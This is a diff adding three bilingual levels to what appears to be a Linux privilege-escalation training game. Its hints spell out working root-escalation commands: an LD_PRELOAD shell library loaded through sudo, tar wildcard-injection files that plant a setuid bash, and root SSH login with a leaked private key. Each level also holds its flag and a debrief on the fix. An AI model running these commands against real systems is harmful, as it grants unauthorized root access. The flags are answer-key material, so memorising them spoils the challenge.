@@ -786,5 +786,254 @@ $db_pass = "S3rv!ce_2024";   // NOTE: svc reuses this for the system login too
                 link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/docker-security'
             }
         }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 11 — LD_PRELOAD via sudo env_keep
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 11,
+        codename: 'box-11',
+        title: { en: 'Box-11 · Preload Pandemonium', fr: 'Box-11 · Chaos au préchargement' },
+        brief: {
+            en: 'sudo lets you run one harmless-looking binary as root — but it also kept LD_PRELOAD in the environment. Load your own library.',
+            fr: 'sudo t\'autorise un binaire d\'apparence inoffensive en root — mais il a aussi gardé LD_PRELOAD dans l\'environnement. Charge ta propre bibliothèque.'
+        },
+        user: 'player',
+        host: 'box-11',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Read your sudo rights and spot env_keep', 'Build a shared object that spawns a shell', 'Preload it through sudo'],
+            fr: ['Lire tes droits sudo et repérer env_keep', 'Construire un objet partagé qui ouvre un shell', 'Le précharger via sudo']
+        },
+        hints: {
+            en: [
+                'Run sudo -l — note "env_keep+=LD_PRELOAD" and the NOPASSWD command you may run.',
+                'Write a tiny library whose _init() runs setuid(0); system("/bin/sh"), then compile it:\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c',
+                'Preload it through the sudo-allowed command:\n  sudo LD_PRELOAD=/tmp/x.so apache2ctl'
+            ],
+            fr: [
+                'Lance sudo -l — repère "env_keep+=LD_PRELOAD" et la commande NOPASSWD autorisée.',
+                'Écris une petite bibliothèque dont _init() fait setuid(0); system("/bin/sh"), puis compile-la :\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c',
+                'Précharge-la via la commande autorisée par sudo :\n  sudo LD_PRELOAD=/tmp/x.so apache2ctl'
+            ]
+        },
+        flag: 'flag{ld_pr3load_env_keep}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'notes.txt'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/home/player/notes.txt': { type: 'file', owner: 'player', mode: '644', content: 'Ops left me sudo on apache2ctl "for restarts".\nThe sudoers Defaults line looks unusually permissive.\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{ld_pr3load_env_keep}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin', 'sbin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'gcc'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
+            '/usr/bin/gcc': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/sbin': { type: 'dir', owner: 'root', mode: '755', children: ['apache2ctl'] },
+            '/usr/sbin/apache2ctl': { type: 'file', owner: 'root', mode: '755', content: '#!/bin/sh\n# apache control wrapper\n' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        sudoers: {
+            player: [
+                { cmd: '/usr/sbin/apache2ctl', nopasswd: true, runas: 'root' }
+            ]
+        },
+        env_keep: ['LD_PRELOAD'],
+        wins: [
+            { type: 'ld_preload' }
+        ],
+        debrief: {
+            en: {
+                vuln: 'sudo env_keep leaves LD_PRELOAD intact',
+                why: 'The sudoers Defaults kept LD_PRELOAD in the environment. Even a restricted NOPASSWD command becomes root code execution: a shared object whose _init() runs setuid(0)/system is loaded before the target binary and executes with root privileges.',
+                fix: 'Never add LD_PRELOAD / LD_LIBRARY_PATH to env_keep. Rely on the default env_reset, keep sudo command allow-lists tight, and prefer full paths with fixed arguments so dangerous environment variables can never be smuggled in.',
+                link: 'https://gtfobins.github.io/gtfobins/'
+            },
+            fr: {
+                vuln: 'sudo env_keep conserve LD_PRELOAD',
+                why: 'La directive Defaults de sudoers gardait LD_PRELOAD dans l\'environnement. Même une commande NOPASSWD restreinte devient de l\'exécution de code root : un objet partagé dont _init() fait setuid(0)/system est chargé avant le binaire cible et s\'exécute avec les droits root.',
+                fix: 'Ne jamais ajouter LD_PRELOAD / LD_LIBRARY_PATH à env_keep. S\'appuyer sur env_reset par défaut, garder des listes de commandes sudo strictes, et préférer des chemins complets avec arguments figés pour qu\'aucune variable d\'environnement dangereuse ne puisse être injectée.',
+                link: 'https://gtfobins.github.io/gtfobins/'
+            }
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 12 — Wildcard injection (tar --checkpoint in a root cron)
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 12,
+        codename: 'box-12',
+        title: { en: 'Box-12 · Wildcard Gone Wild', fr: 'Box-12 · Le joker sauvage' },
+        brief: {
+            en: 'A root cron archives a directory you can write to, using tar with a "*". Filenames can become tar options. Weaponise the wildcard.',
+            fr: 'Un cron root archive un dossier où tu peux écrire, avec tar et un "*". Les noms de fichiers peuvent devenir des options tar. Arme le joker.'
+        },
+        user: 'player',
+        host: 'box-12',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Read the root cron and its tar command', 'Drop a script plus crafted --checkpoint files', 'Wait for cron to run tar as root'],
+            fr: ['Lire le cron root et sa commande tar', 'Déposer un script et des fichiers --checkpoint piégés', 'Attendre que cron lance tar en root']
+        },
+        hints: {
+            en: [
+                'cat /etc/crontab — root runs: cd /home/player/share && tar -czf /var/backups/share.tar.gz *',
+                'The "*" expands to filenames, and tar treats --checkpoint-action=exec=... as an option. Create a payload script first:\n  cd /home/player/share\n  echo \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' > runme.sh',
+                'Now craft the option-filenames (the ./ prefix stops touch treating them as flags) so tar runs your script:\n  touch ./--checkpoint=1\n  touch \'./--checkpoint-action=exec=sh runme.sh\'\n  wait'
+            ],
+            fr: [
+                'cat /etc/crontab — root lance : cd /home/player/share && tar -czf /var/backups/share.tar.gz *',
+                'Le "*" est remplacé par les noms de fichiers, et tar interprète --checkpoint-action=exec=... comme une option. Crée d\'abord un script payload :\n  cd /home/player/share\n  echo \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' > runme.sh',
+                'Puis fabrique les fichiers-options (le préfixe ./ empêche touch de les prendre pour des options) pour que tar exécute ton script :\n  touch ./--checkpoint=1\n  touch \'./--checkpoint-action=exec=sh runme.sh\'\n  wait'
+            ]
+        },
+        flag: 'flag{w1ldcard_tar_ch3ckpoint}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'share'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/home/player/share': { type: 'dir', owner: 'player', mode: '755', children: ['report.txt', 'data.csv'] },
+            '/home/player/share/report.txt': { type: 'file', owner: 'player', mode: '644', content: 'weekly report\n' },
+            '/home/player/share/data.csv': { type: 'file', owner: 'player', mode: '644', content: 'a,b,c\n1,2,3\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'crontab'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/crontab': { type: 'file', owner: 'root', mode: '644', content:
+`# /etc/crontab: system-wide crontab
+SHELL=/bin/sh
+PATH=/usr/sbin:/usr/bin:/sbin:/bin
+
+# m h dom mon dow user  command
+*  *  *   *   *  root  cd /home/player/share && tar -czf /var/backups/share.tar.gz *
+` },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{w1ldcard_tar_ch3ckpoint}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'tar', 'touch'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/tar': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/touch': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: ['backups'] },
+            '/var/backups': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        wins: [
+            { type: 'wildcard_tar', dir: '/home/player/share' }
+        ],
+        debrief: {
+            en: {
+                vuln: 'Wildcard injection into a root tar cron',
+                why: 'root ran tar ... * in a directory you control. The shell expands "*" to the filenames, and tar reads --checkpoint / --checkpoint-action=exec=... as command-line options. Files named after those options make tar execute your script as root.',
+                fix: 'Never use unquoted wildcards in privileged scripts. Pass an explicit file list or use "--" and ./ prefixes (tar ... -- *), avoid running archivers over user-writable directories as root, and prefer safe APIs over shell globbing.',
+                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks'
+            },
+            fr: {
+                vuln: 'Injection de wildcard dans un cron tar root',
+                why: 'root lançait tar ... * dans un dossier que tu contrôles. Le shell remplace "*" par les noms de fichiers, et tar lit --checkpoint / --checkpoint-action=exec=... comme des options. Des fichiers nommés comme ces options font exécuter ton script par tar, en root.',
+                fix: 'Ne jamais utiliser de wildcard non quoté dans un script privilégié. Passe une liste de fichiers explicite ou utilise "--" et le préfixe ./ (tar ... -- *), évite d\'archiver en root des dossiers modifiables par l\'utilisateur, et préfère des API sûres au globbing shell.',
+                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks'
+            }
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 13 — World-readable root SSH private key
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 13,
+        codename: 'box-13',
+        title: { en: 'Box-13 · Keys to the Kingdom', fr: 'Box-13 · Les clés du royaume' },
+        brief: {
+            en: 'A backup left root\'s SSH private key world-readable. If root accepts that key, you can just log in as root.',
+            fr: 'Une sauvegarde a laissé la clé privée SSH de root lisible par tous. Si root accepte cette clé, tu peux simplement te connecter en root.'
+        },
+        user: 'player',
+        host: 'box-13',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Find readable files under /opt/backup', 'Recover root\'s private SSH key', 'Log in as root with it'],
+            fr: ['Trouver les fichiers lisibles sous /opt/backup', 'Récupérer la clé privée SSH de root', 'Se connecter en root avec']
+        },
+        hints: {
+            en: [
+                'Look for stray key material: ls -la /opt/backup — id_rsa is world-readable.',
+                'cat /opt/backup/id_rsa — that is root\'s private key, and /root/.ssh/authorized_keys trusts it.',
+                'Use it to log in as root:\n  ssh -i /opt/backup/id_rsa root@localhost'
+            ],
+            fr: [
+                'Cherche des clés qui traînent : ls -la /opt/backup — id_rsa est lisible par tous.',
+                'cat /opt/backup/id_rsa — c\'est la clé privée de root, et /root/.ssh/authorized_keys lui fait confiance.',
+                'Utilise-la pour te connecter en root :\n  ssh -i /opt/backup/id_rsa root@localhost'
+            ]
+        },
+        flag: 'flag{r00t_ssh_key_l00t}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt', '.ssh'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{r00t_ssh_key_l00t}\n' },
+            '/root/.ssh': { type: 'dir', owner: 'root', mode: '700', children: ['authorized_keys'] },
+            '/root/.ssh/authorized_keys': { type: 'file', owner: 'root', mode: '600', content: 'ssh-rsa AAAAB3NzaC1yc2E...backup-key root@box-13\n' },
+            '/opt': { type: 'dir', owner: 'root', mode: '755', children: ['backup'] },
+            '/opt/backup': { type: 'dir', owner: 'root', mode: '755', children: ['id_rsa', 'id_rsa.pub', 'README'] },
+            '/opt/backup/id_rsa': { type: 'file', owner: 'root', mode: '644', content:
+`-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt
+ZW3vYmFja3VwLWtleS1sZWFrZWQtZG8tbm90LXVzZS1pbi1wcm9kAAAAAAECAwQF
+-----END OPENSSH PRIVATE KEY-----
+` },
+            '/opt/backup/id_rsa.pub': { type: 'file', owner: 'root', mode: '644', content: 'ssh-rsa AAAAB3NzaC1yc2E...backup-key root@box-13\n' },
+            '/opt/backup/README': { type: 'file', owner: 'root', mode: '644', content: 'Nightly key backup. TODO: fix perms (currently world-readable!).\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'ssh'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/ssh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        wins: [
+            { type: 'ssh_key' }
+        ],
+        debrief: {
+            en: {
+                vuln: 'World-readable root SSH private key',
+                why: 'A backup job copied root\'s private key to /opt/backup and left it world-readable. Because /root/.ssh/authorized_keys trusts the matching public key, anyone who can read the private key can authenticate as root over SSH — no password, no exploit.',
+                fix: 'Private keys must be 600 and owned by their user; never copy them to shared/backup locations in cleartext. Encrypt backups, rotate any exposed key immediately, and audit file permissions on key material.',
+                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reading-root-ssh-keys'
+            },
+            fr: {
+                vuln: 'Clé privée SSH de root lisible par tous',
+                why: 'Une sauvegarde a copié la clé privée de root dans /opt/backup en la laissant lisible par tous. Comme /root/.ssh/authorized_keys fait confiance à la clé publique correspondante, quiconque peut lire la clé privée s\'authentifie en root via SSH — sans mot de passe ni exploit.',
+                fix: 'Les clés privées doivent être en 600 et appartenir à leur utilisateur ; ne jamais les copier en clair dans des emplacements partagés/de sauvegarde. Chiffre les sauvegardes, révoque immédiatement toute clé exposée, et audite les permissions du matériel de clés.',
+                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reading-root-ssh-keys'
+            }
+        }
     }
 ];
